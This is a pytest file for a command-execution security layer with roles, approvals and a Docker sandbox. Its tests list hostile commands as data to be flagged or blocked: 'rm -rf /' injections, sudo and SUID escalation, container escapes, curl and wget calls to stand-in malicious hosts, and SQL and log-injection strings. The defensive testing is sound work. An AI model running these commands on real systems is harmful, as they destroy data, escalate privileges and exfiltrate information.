"""
Advanced Security Edge Case Tests

Tests for various security edge cases, attack vectors, and boundary conditions
that could potentially bypass security controls or cause system failures.
"""

import asyncio
import json
import os
import tempfile
import time
from unittest.mock import patch

import pytest

from src.enhanced_security_layer import EnhancedSecurityLayer
from src.secure_command_executor import CommandRisk


class TestSecurityEdgeCases:
    """Test advanced security edge cases and attack vectors"""

    def setup_method(self):
        """Set up test fixtures with realistic security configuration"""
        self.temp_audit_file = tempfile.NamedTemporaryFile(delete=False)
        self.temp_audit_file.close()

        # Create comprehensive security configuration
        self.security_config = {
            "enable_auth": True,
            "enable_command_security": True,
            "audit_log_file": self.temp_audit_file.name,
            "command_approval_required": True,
            "use_docker_sandbox": True,
            "max_approval_timeout": 300,  # 5 minutes
            "max_pending_approvals": 100,
            "roles": {
                "admin": {
                    "permissions": ["allow_all", "allow_shell_execute"],
                    "restrictions": [],
                },
                "developer": {
                    "permissions": ["allow_shell_execute", "read_files"],
                    "restrictions": ["no_sudo", "no_system_modify"],
                },
                "tester": {
                    "permissions": ["read_only", "execute_tests"],
                    "restrictions": ["no_shell", "no_network"],
                },
                "guest": {
                    "permissions": ["read_only"],
                    "restrictions": ["no_execute", "no_modify", "no_network"],
                },
            },
        }

        with patch("src.enhanced_security_layer.global_config_manager") as mock_config:
            mock_config.get.return_value = self.security_config
            self.security = EnhancedSecurityLayer()

    def teardown_method(self):
        """Clean up test fixtures"""
        try:
            os.unlink(self.temp_audit_file.name)
        except OSError:
            pass

    # === Command Injection Edge Cases ===

    async def test_command_injection_attempts(self):
        """Test various command injection techniques"""
        injection_attempts = [
            # Shell metacharacters
            "ls; rm -rf /",
            "ls && sudo rm -rf /",
            "ls || sudo shutdown -h now",
            "ls | sudo rm -rf /",
            # Command substitution
            "ls $(rm -rf /)",
            "ls `rm -rf /`",
            # Environment manipulation
            "PATH=/malicious:$PATH ls",
            "LD_PRELOAD=/malicious.so ls",
            # Unicode and encoding bypasses
            "ls \u0000 rm -rf /",
            "ls%20%26%26%20rm%20-rf%20/",
            # Null byte injection
            "ls\x00rm -rf /",
            # ANSI escape sequences
            "ls\033[2J\033[H; rm -rf /",
        ]

        for malicious_command in injection_attempts:
            # Should detect high risk
            risk, warnings = self.security.command_executor.assess_command_risk(
                malicious_command
            )
            assert risk in [
                CommandRisk.HIGH,
                CommandRisk.CRITICAL,
            ], f"Failed to detect injection attempt: {malicious_command}"
            assert len(warnings) > 0

            # Should require approval or be blocked
            result = await self.security.execute_command(
                malicious_command, user="developer", user_role="developer"
            )
            assert not result.get(
                "success", False
            ), f"Injection attempt succeeded: {malicious_command}"

    async def test_privilege_escalation_attempts(self):
        """Test various privilege escalation techniques"""
        escalation_attempts = [
            # Direct sudo attempts
            "sudo su -",
            "sudo -i",
            "sudo bash",
            # SUID exploitation
            "find / -perm -4000 2>/dev/null",
            "chmod +s /bin/bash",
            # Kernel exploits simulation
            "echo 'kernel exploit' > /proc/sys/kernel/modprobe",
            # Container escape attempts
            "docker run --privileged alpine",
            "mount /proc/1/root/",
            # Environment exploitation
            "export SHELL=/bin/sh; sudo -E sh",
        ]

        for escalation_command in escalation_attempts:
            risk, warnings = self.security.command_executor.assess_command_risk(
                escalation_command
            )
            assert risk in [CommandRisk.HIGH, CommandRisk.CRITICAL]

            # Non-admin users should be blocked
            result = await self.security.execute_command(
                escalation_command, user="developer", user_role="developer"
            )
            assert not result.get("success", False)

    # === Authentication Bypass Edge Cases ===

    async def test_auth_bypass_attempts(self):
        """Test authentication bypass techniques"""
        # Test with various malformed usernames
        malformed_users = [
            "",  # Empty username
            None,  # Null username
            "admin' OR '1'='1",  # SQL injection style
            "admin\x00",  # Null byte
            "admin\n\radmin",  # CRLF injection
            "../admin",  # Path traversal
            "admin; echo 'bypass'",  # Command injection
        ]

        for malformed_user in malformed_users:
            # Should not authenticate successfully
            auth_result = self.security.authenticate_user(malformed_user, "password")
            assert not auth_result.get("authenticated", False)

    async def test_role_confusion_attacks(self):
        """Test role confusion and privilege confusion attacks"""
        # Attempt to impersonate roles
        role_confusion_attempts = [
            ("user", "admin"),  # User claiming admin role
            ("guest", "developer"),  # Guest claiming developer role
            ("", "admin"),  # Empty user with admin role
            ("admin", ""),  # Admin with empty role
        ]

        for user, claimed_role in role_confusion_attempts:
            # Should enforce actual user role, not claimed role
            _has_permission = self.security.check_permission(
                user, "allow_shell_execute", user_role=claimed_role
            )

            if user != "admin":
                # Non-admin users shouldn't get admin permissions regardless of claimed role
                dangerous_command = "rm -rf /tmp/test"
                result = await self.security.execute_command(
                    dangerous_command, user=user, user_role=claimed_role
                )
                # Should either be blocked or require approval
                assert not result.get("success", False) or result.get(
                    "requires_approval", False
                )

    # === Resource Exhaustion Edge Cases ===

    async def test_approval_queue_flooding(self):
        """Test flooding the approval queue to cause DoS"""
        # Try to flood with many approval requests
        flood_commands = [f"ls /tmp/test_{i}" for i in range(150)]  # Exceed max

        approval_ids = []
        for cmd in flood_commands:
            try:
                result = await self.security.execute_command(
                    cmd, user="developer", user_role="developer"
                )
                if result.get("requires_approval"):
                    approval_ids.append(result.get("approval_id"))
            except Exception:
                # Should handle gracefully and not crash
                pass

        # Should not exceed maximum pending approvals
        pending = self.security.get_pending_approvals()
        assert len(pending) <= self.security_config["max_pending_approvals"]

    async def test_concurrent_approval_race_conditions(self):
        """Test race conditions in concurrent approval handling"""
        # Create multiple concurrent approval requests
        command = "echo 'test'"

        async def create_approval_request():
            return await self.security.execute_command(
                command, user="developer", user_role="developer"
            )

        # Run concurrent requests
        tasks = [create_approval_request() for _ in range(10)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Should handle all requests without exceptions
        for result in results:
            assert not isinstance(result, Exception)

        # Test concurrent approval/denial
        pending = self.security.get_pending_approvals()
        if pending:
            approval_id = pending[0]["approval_id"]

            async def approve_request():
                self.security.approve_command(approval_id, True)

            async def deny_request():
                self.security.approve_command(approval_id, False)

            # Only one should succeed
            results = await asyncio.gather(
                approve_request(), deny_request(), return_exceptions=True
            )
            # At least one should succeed, others might fail gracefully

    # === Audit Log Manipulation Edge Cases ===

    async def test_audit_log_manipulation_attempts(self):
        """Test attempts to manipulate or corrupt audit logs"""
        # Test log injection attempts
        log_injection_attempts = [
            "test\n{'fake': 'log_entry'}",
            'test\r\n{"malicious": "entry"}',
            "test\x00malicious_data",
            "test\033[2J\033[Hclear_screen",
        ]

        for malicious_input in log_injection_attempts:
            # Log the malicious input
            self.security.audit_log(
                action="test_action",
                user=malicious_input,
                outcome="success",
                details={"test": malicious_input},
            )

        # Verify log integrity
        history = self.security.get_command_history()
        for entry in history:
            # Should be valid JSON
            try:
                if isinstance(entry, str):
                    json.loads(entry)
                else:
                    # Already parsed, should be dict
                    assert isinstance(entry, dict)
            except json.JSONDecodeError:
                pytest.fail(f"Corrupted log entry found: {entry}")

    async def test_log_file_tampering_resilience(self):
        """Test resilience against log file tampering"""
        # First, create some legitimate log entries
        for i in range(5):
            self.security.audit_log(
                action=f"test_action_{i}",
                user="test_user",
                outcome="success",
                details={"iteration": i},
            )

        # Simulate log file tampering
        with open(self.temp_audit_file.name, "a") as f:
            f.write("TAMPERED_DATA\n")
            f.write("{invalid_json\n")
            f.write("}")

        # Should handle corrupted entries gracefully
        try:
            history = self.security.get_command_history()
            # Should still return valid entries, skipping corrupted ones
            assert len(history) >= 0  # Should not crash
        except Exception as e:
            pytest.fail(f"Failed to handle corrupted log file: {e}")

    # === Configuration Bypass Edge Cases ===

    async def test_configuration_override_attempts(self):
        """Test attempts to override security configuration"""
        # Attempt to modify security settings
        original_config = self.security_config.copy()

        # Try various configuration bypass techniques
        bypass_attempts = [
            {"enable_command_security": False},
            {"command_approval_required": False},
            {"use_docker_sandbox": False},
            {"roles": {"guest": {"permissions": ["allow_all"]}}},
        ]

        for bypass_config in bypass_attempts:
            with patch(
                "src.enhanced_security_layer.global_config_manager"
            ) as mock_config:
                # Simulate config change during runtime
                modified_config = original_config.copy()
                modified_config.update(bypass_config)
                mock_config.get.return_value = modified_config

                # Create new security instance
                new_security = EnhancedSecurityLayer()

                # Test that dangerous commands are still properly handled
                dangerous_command = "rm -rf /tmp/test"
                _result = await new_security.execute_command(
                    dangerous_command, user="guest", user_role="guest"
                )

                # Even with modified config, should have some protection
                # (This test verifies the security layer doesn't blindly trust config)

    # === Time-based Attack Edge Cases ===

    async def test_approval_timeout_manipulation(self):
        """Test manipulation of approval timeouts"""
        # Create approval request
        result = await self.security.execute_command(
            "echo 'timeout test'", user="developer", user_role="developer"
        )

        if result.get("requires_approval"):
            approval_id = result.get("approval_id")

            # Simulate time manipulation by mocking time
            with patch("time.time") as mock_time:
                # Set time far in the future
                mock_time.return_value = time.time() + 10000

                # Approval should be expired
                try:
                    self.security.approve_command(approval_id, True)
                    # Should handle expired approvals gracefully
                except Exception as e:
                    # Should be a controlled exception, not a crash
                    assert "timeout" in str(e).lower() or "expired" in str(e).lower()

    async def test_rapid_fire_requests(self):
        """Test rapid-fire command execution requests"""
        # Send many requests in quick succession
        commands = [f"echo 'rapid_{i}'" for i in range(50)]

        start_time = time.time()
        results = []

        for cmd in commands:
            try:
                result = await self.security.execute_command(
                    cmd, user="developer", user_role="developer"
                )
                results.append(result)
            except Exception as e:
                # Should handle gracefully
                results.append({"error": str(e)})

        end_time = time.time()

        # Should handle all requests without crashing
        assert len(results) == len(commands)

        # Should not take excessively long (rate limiting might apply)
        execution_time = end_time - start_time
        assert execution_time < 30  # Reasonable upper bound

    # === Docker Sandbox Escape Edge Cases ===

    async def test_docker_sandbox_escape_attempts(self):
        """Test various Docker sandbox escape techniques"""
        escape_attempts = [
            # Mount escapes
            "docker run -v /:/host alpine chroot /host",
            "docker run --privileged alpine",
            # Process escapes
            "docker run alpine nsenter -t 1 -m -u -i -n -p sh",
            # Device escapes
            "docker run --device=/dev/mem alpine",
            # Capability escapes
            "docker run --cap-add=SYS_ADMIN alpine",
            # Network escapes
            "docker run --net=host alpine",
        ]

        for escape_cmd in escape_attempts:
            risk, warnings = self.security.command_executor.assess_command_risk(
                escape_cmd
            )
            assert risk in [CommandRisk.HIGH, CommandRisk.CRITICAL]

            # Should be blocked or require high-level approval
            result = await self.security.execute_command(
                escape_cmd, user="developer", user_role="developer"
            )
            assert not result.get("success", False)

    # === Input Validation Edge Cases ===

    async def test_malformed_input_handling(self):
        """Test handling of various malformed inputs"""
        malformed_inputs = [
            # Various data types
            None,
            123,
            [],
            {},
            # Very long strings
            "A" * 10000,
            # Binary data
            b"\x00\x01\x02\xff",
            # Unicode edge cases
            "\U0001F4A9\U0001F631\U0001F4AF",  # Emojis
            "\u202E" + "normal text",  # Right-to-left override
        ]

        for malformed_input in malformed_inputs:
            try:
                # Should handle gracefully without crashing
                if isinstance(malformed_input, str):
                    result = await self.security.execute_command(
                        malformed_input, user="test", user_role="developer"
                    )
                    # Should either succeed safely or fail gracefully
                    assert isinstance(result, dict)
                else:
                    # Non-string inputs should be handled appropriately
                    # (converted to string or rejected)
                    pass
            except Exception as e:
                # Should be controlled exceptions, not crashes
                assert isinstance(e, (ValueError, TypeError))

    # === Network Security Edge Cases ===

    async def test_network_command_restrictions(self):
        """Test network-related command restrictions"""
        network_commands = [
            # Data exfiltration attempts
            "curl http://malicious.com/exfiltrate",
            "wget http://evil.com/payload",
            "nc -l -p 1234",
            "python -m http.server 8080",
            # Port scanning
            "nmap -sS target.com",
            "masscan -p1-65535 target.com",
            # DNS manipulation
            "dig @8.8.8.8 malicious.com",
            "nslookup malicious.com",
        ]

        for net_cmd in network_commands:
            # Should be detected as network-related and high risk
            risk, warnings = self.security.command_executor.assess_command_risk(net_cmd)
            assert risk in [CommandRisk.MEDIUM, CommandRisk.HIGH, CommandRisk.CRITICAL]

            # For restricted roles, should be blocked
            result = await self.security.execute_command(
                net_cmd, user="guest", user_role="guest"
            )
            assert not result.get("success", False)


class TestSecurityBoundaryConditions:
    """Test boundary conditions and limit cases for security systems"""

    def setup_method(self):
        """Set up boundary condition tests"""
        self.temp_audit_file = tempfile.NamedTemporaryFile(delete=False)
        self.temp_audit_file.close()

        # Minimal security configuration for boundary testing
        self.minimal_config = {
            "enable_auth": False,
            "enable_command_security": False,
            "audit_log_file": self.temp_audit_file.name,
        }

        with patch("src.enhanced_security_layer.global_config_manager") as mock_config:
            mock_config.get.return_value = self.minimal_config
            self.security = EnhancedSecurityLayer()

    def teardown_method(self):
        """Clean up test fixtures"""
        try:
            os.unlink(self.temp_audit_file.name)
        except OSError:
            pass

    async def test_empty_security_configuration(self):
        """Test behavior with minimal/empty security configuration"""
        # Should still function without crashing
        result = await self.security.execute_command(
            "echo 'test'", user="test", user_role="test"
        )
        assert isinstance(result, dict)

    async def test_maximum_command_length(self):
        """Test handling of extremely long commands"""
        # Test various command lengths
        lengths = [1000, 10000, 100000, 1000000]

        for length in lengths:
            long_command = "echo '" + "A" * length + "'"
            try:
                risk, warnings = self.security.command_executor.assess_command_risk(
                    long_command
                )
                # Should handle without crashing
                assert isinstance(risk, CommandRisk)
            except Exception as e:
                # Should be controlled resource limitations
                assert "too long" in str(e).lower() or "memory" in str(e).lower()

    async def test_zero_length_inputs(self):
        """Test handling of zero-length and minimal inputs"""
        minimal_inputs = ["", " ", "\n", "\t", "\r\n"]

        for minimal_input in minimal_inputs:
            result = await self.security.execute_command(
                minimal_input, user="test", user_role="test"
            )
            # Should handle gracefully
            assert isinstance(result, dict)

    async def test_maximum_audit_log_size(self):
        """Test audit log behavior at size limits"""
        # Generate many log entries
        for i in range(1000):
            self.security.audit_log(
                action=f"test_action_{i}",
                user="test_user",
                outcome="success",
                details={"iteration": i, "data": "A" * 1000},
            )

        # Should still be able to retrieve history
        history = self.security.get_command_history(limit=10)
        assert len(history) <= 10
        assert isinstance(history, list)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
